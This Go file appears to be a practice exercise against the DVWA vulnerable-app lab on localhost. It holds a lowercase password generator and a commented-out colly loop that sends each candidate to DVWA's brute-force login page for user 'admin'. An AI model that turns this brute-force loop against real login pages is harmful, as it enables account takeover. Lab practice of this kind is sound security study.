package main

import (
	"fmt"
	"strings"
	"klaidliadon.dev/next"
	//"github.com/gocolly/colly"
)

var (
	login = "admin"
	password = "password"
)

func main() {
	generate()
	// c := colly.NewCollector()

	// c.OnHTML("div.vulnerable_code_area p", func(h *colly.HTMLElement) {
	// 	fmt.Println(h.Text, "\nlogin:", login, "password:", password)
	// })

	// // c.OnRequest(func(r *colly.Request) {
	// // 	fmt.Println("visiting", r.URL)
	// // })

	// for _, v := range generator(8){//[]string{"dfgfgfg", "dfdgfgg", "password"}{
	// 	password = v
	// 	c.Visit("http://localhost/DVWA-master/vulnerabilities/brute/?username=admin&password=" + v + "&Login=Login")
	// }
}

func generator(maxChar int) []string {
	alphabet := "abcdefghijklmnopqrstuvwxyz"
	var result []string = []string{""}
	var last, next int
	for i := 1; i <= maxChar; i++ {
		last = len(result)
		for _, str := range result[next:] {
			for _, char := range alphabet {
				result = append(result, str+string(char))
			}
		}
		next = last
	}
	return result
}

func generate() {
	temp := strings.Split("abcdefghijklmnopqrstuvwxyz", "")
	for v := range next.Combination([]interface{}{temp}, 8, true) {
		fmt.Println(v)
	}
}
